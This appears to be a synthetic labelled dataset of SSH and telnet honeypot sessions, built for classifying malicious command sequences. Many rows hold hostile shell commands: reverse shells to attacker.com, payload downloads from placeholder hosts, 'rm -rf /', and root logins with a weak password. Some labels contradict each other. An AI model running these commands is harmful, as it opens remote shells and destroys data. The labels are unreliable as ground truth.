session,src_ip,protocol,duration,input_token_count,unique_commands,command_sequence,label
309ff9c3-1d9c-4e81-8fd6-c4f965f12170,124.118.117.47,ssh,191.66,3,4,; exit; pwd; uptime,0
97f9614b-0e0d-4655-a262-88d384aee0ef,36.168.94.96,telnet,73.57,9,4,curl -O http://badhost/exploit; ./payload.sh; scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh,1
ed7c0d68-af2f-4b0f-9b3b-1807bcc24420,139.45.102.233,ssh,692.33,24,6,echo 'pwned' > /tmp/x; sshpass -p '1234' ssh root@target; chmod +x payload.sh; wget http://malicious.site/payload.sh; sshpass -p '1234' ssh root@target; echo 'pwned' > /tmp/x; ./payload.sh,1
671ec9c5-fc85-42b3-bcd1-808fb954854e,201.138.118.231,ssh,637.19,20,4,sshpass -p '1234' ssh root@target; ./payload.sh; sshpass -p '1234' ssh root@target; python -m http.server 8080; sshpass -p '1234' ssh root@target,1
28d68ae7-fd83-434a-bf2d-c94402822415,194.192.80.24,ssh,241.06,2,2,pwd; logout,0
4b444669-5dbd-4695-a122-03baad3f57f2,195.174.179.94,ssh,18.26,18,6,wget http://malicious.site/payload.sh; nc -e /bin/sh attacker.com 4444; ./payload.sh; chmod +x payload.sh; sshpass -p '1234' ssh root@target; wget http://malicious.site/payload.sh,1
8d45d165-9f75-45d4-b5cf-74470c3b8284,234.205.183.107,ssh,297.7,29,6,python -m http.server 8080; nc -e /bin/sh attacker.com 4444; rm -rf /; sshpass -p '1234' ssh root@target; curl -O http://badhost/exploit; sshpass -p '1234' ssh root@target; python -m http.server 8080,1
3d3a5b19-875e-4649-bd24-46df3295679a,189.141.27.173,ssh,98.28,17,4,sshpass -p '1234' ssh root@target; nc -e /bin/sh attacker.com 4444; python -m http.server 8080; curl -O http://badhost/exploit,1
49f8a5f2-a5e5-4f7c-acde-c19e52b70b5c,16.205.245.106,ssh,230.64,4,3,; cd /home; cd /home; ,0
1775cac1-a51e-44fa-9264-2e38b25274a3,123.72.176.7,ssh,723.88,15,4,python -m http.server 8080; python -m http.server 8080; curl -O http://badhost/exploit; echo 'pwned' > /tmp/x,1
fd1c6976-7fde-4ed8-8c13-1b9ca1465725,141.55.148.163,ssh,279.87,4,3,logout; cd /home; exit,0
941e73d3-5e06-4bfd-ae2e-9f560b34a0f1,175.180.230.168,telnet,178.77,6,3,cd /tmp; chmod +x script.sh; ./script.sh,1
9f6cec40-401e-429b-ad67-52ef9ccf1f44,54.233.53.113,ssh,461.81,12,4,wget http://malicious.site/payload.sh; rm -rf /; echo 'pwned' > /tmp/x; curl -O http://badhost/exploit,1
b0ace3b2-d7c9-414b-9626-a73d11f30e2a,239.13.144.237,ssh,294.13,2,3,; exit; date,0
7b9e3474-fe6e-4cdb-a232-6c64161f3472,167.216.236.2,ssh,145.74,2,2,whoami; ls,0
ad1c6a2f-0c43-443b-a96a-811e3fcba9cc,253.120.137.54,telnet,108.2,3,2,cd /home; logout,0
c9c64163-2cee-4a89-afe9-63ecd982fe7e,135.246.148.73,ssh,67.4,3,2,logout; uptime; uptime,0
0020617e-bff0-4e16-93e4-85e4c90822e9,14.255.222.28,ssh,168.62,25,7,rm -rf /; ./payload.sh; rm -rf /; python -m http.server 8080; echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444; sshpass -p '1234' ssh root@target,1
de351e17-b101-4c46-ac88-02f521206810,25.56.42.104,ssh,525.46,13,4,chmod +x payload.sh; echo 'pwned' > /tmp/x; scp exploit.sh root@target:/tmp/; chmod +x payload.sh,1
240f8c7c-3173-4160-a89e-de7df9eb444d,46.64.202.39,ssh,360.7,5,3,ls; whoami; curl -O http://badhost/file,1
5fc5e2de-9541-4f46-bb45-346bf06167c7,53.103.169.161,ssh,465.47,13,3,wget http://malicious.site/payload.sh; chmod +x payload.sh; chmod +x payload.sh; sshpass -p '1234' ssh root@target,1
66b718e9-d677-4ae8-8018-dd16db1c8ac4,239.156.166.99,ssh,207.05,2,2,uptime; ls,0
c3c41ffa-c847-41f6-9857-758424aa7a18,152.210.227.172,ssh,564.27,19,5,echo 'pwned' > /tmp/x; rm -rf /; nc -e /bin/sh attacker.com 4444; python -m http.server 8080; curl -O http://badhost/exploit,1
b32a91af-70be-4a04-ad0e-87a816f0843a,160.165.245.213,ssh,191.34,2,3,exit; pwd; ,0
5d4e22d1-27ec-4d44-bbaa-3f5b8b82798e,5.100.100.27,ssh,260.01,17,6,wget http://malicious.site/payload.sh; python -m http.server 8080; ./payload.sh; sshpass -p '1234' ssh root@target; chmod +x payload.sh; wget http://malicious.site/payload.sh,1
ambiguous-extra-139,10.1.0.139,ssh,394.8032169,3,4,chmod +x payload.sh; cd /; nc -e /bin/sh attacker.com; date,0
3cffdce0-94f2-4537-a013-74a522f6eabc,200.156.98.38,ssh,183.3,3,3,date; whoami; ls,0
4530d42c-aab5-4c0e-a6a5-a3330bec0e7a,31.148.128.137,ssh,356.88,16,3,sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/,1
dcdf7202-831d-4f71-ad2e-a3944583d9fe,58.241.235.36,ssh,25.84,3,3,pwd; ; cd /home,0
cbabdd5c-e7f1-4e8d-aa99-56925979ae10,168.135.172.26,ssh,102.43,3,3,logout; whoami; pwd,0
ebaca687-1333-4330-aa25-ee9a5f10a365,189.138.76.66,ssh,893.65,22,5,sshpass -p '1234' ssh root@target; sshpass -p '1234' ssh root@target; python -m http.server 8080; nc -e /bin/sh attacker.com 4444; rm -rf /,1
04f4a927-4744-4abc-ba57-4c97bf0d95bf,212.6.163.222,ssh,88.53,4,4,pwd; ls; pwd; uptime,0
80ed18d8-3d45-4b45-99d2-b5509e389e1a,177.18.149.243,ssh,521.24,13,4,scp exploit.sh root@target:/tmp/; scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh; nc -e /bin/sh attacker.com 4444,1
b13c9fa5-ffaf-4a18-9f2a-92e1bca586f2,187.249.183.248,ssh,215.72,6,3,cd /tmp; chmod +x script.sh; ./script.sh,0
0c9a4886-f5cd-41a0-8ca1-b276223cb6f2,10.246.82.109,ssh,195.16,3,3,cd /home; date; ,0
9c610eb7-9640-42ac-9de8-1fb6a5afaa6d,85.16.179.97,ssh,890.05,14,4,chmod +x payload.sh; nc -e /bin/sh attacker.com 4444; wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x,1
ba2535b1-49ba-41bf-b2e9-b118a6b964f2,77.108.244.243,ssh,173.27,4,4,; date; cd /home; logout,0
e5175db3-22bd-4e82-a1e8-5592aee52ee3,226.172.3.155,ssh,365.61,21,5,sshpass -p '1234' ssh root@target; nc -e /bin/sh attacker.com 4444; ./payload.sh; ./payload.sh; scp exploit.sh root@target:/tmp/; curl -O http://badhost/exploit; curl -O http://badhost/exploit,1
9dd6e11f-4e47-447f-91bf-3f564a62b8db,168.32.206.223,ssh,251.2,3,4,exit; date; pwd; ,0
de1bacc7-ed3b-4a89-b16d-8c175362f227,3.42.0.68,ssh,217.85,4,3,cd /home; logout; pwd,0
ae4887d2-fa44-4b92-b33f-c3b0144f24f0,234.118.235.16,ssh,210.06,4,4,exit; logout; ; cd /home,0
566436b4-689b-4555-8100-7569738d446f,150.17.61.40,telnet,24.27,2,2,whoami; uptime,0
ambiguous-extra-135,10.1.0.135,telnet,8.046665931,15,4,curl http://exploit; date; pwd; whoami; wget http://bad.com,1
ambiguous-extra-90,10.1.0.90,ssh,320.2395294,13,6,whoami; curl http://exploit; ls; wget http://bad.com,1
ce14f994-7fee-4f0b-8321-c5adb04286a5,249.6.234.202,ssh,282.38,16,3,rm -rf /; sshpass -p '1234' ssh root@target; sshpass -p '1234' ssh root@target; curl -O http://badhost/exploit,1
6a587659-aa06-45a6-9457-c0cc86d73e82,144.234.239.149,ssh,408.43,24,6,scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; python -m http.server 8080; echo 'pwned' > /tmp/x; ./payload.sh; echo 'pwned' > /tmp/x; chmod +x payload.sh,1
6b98a234-a194-444e-945e-5feb4cefb0e7,182.58.70.146,ssh,240.46,0,2,; ,0
f3668a09-0b26-41d9-a78f-5a2611dc72b5,175.201.230.105,ssh,65.86,12,4,wget http://malicious.site/payload.sh; ./payload.sh; scp exploit.sh root@target:/tmp/; curl -O http://badhost/exploit; curl -O http://badhost/exploit,1
428f3809-fded-4206-b645-b45ad2e10140,188.53.100.1,ssh,251.37,5,4,logout; date; ls; cd /home,0
3106f18c-7bbe-4fd4-8d90-e2383d53897b,18.44.164.70,ssh,42.35,1,2,; exit,0
9a0fbce3-b247-4e39-bd80-b299ce38e9c2,98.243.71.14,ssh,139.47,1,2,; whoami,0
5a199285-e42a-4755-b97b-ba3e6a0b6e08,42.103.57.65,telnet,784.5,25,5,scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x; sshpass -p '1234' ssh root@target; nc -e /bin/sh attacker.com 4444; sshpass -p '1234' ssh root@target; rm -rf /,1
23bea0b0-7920-4dd5-8599-d1f7a71ac914,150.43.110.30,ssh,281.74,1,3,; ; uptime,0
26d31efb-c3ef-4bf0-9c60-9b56c90bd38b,101.74.145.114,ssh,688.37,22,4,chmod +x payload.sh; scp exploit.sh root@target:/tmp/; scp exploit.sh root@target:/tmp/; chmod +x payload.sh; sshpass -p '1234' ssh root@target; sshpass -p '1234' ssh root@target,1
63a42eb2-f3ed-4d9f-8563-9d4599e4596f,42.208.116.209,ssh,54.31,2,2,whoami; date,0
9033126d-0798-4c2f-90b6-70bbf88086eb,21.139.33.174,telnet,182.74,3,4,logout; ; exit; logout,0
e6f4a56a-f081-49c9-96a5-f41ec0868e01,88.18.68.31,ssh,616.98,14,4,sshpass -p '1234' ssh root@target; nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/; ./payload.sh,1
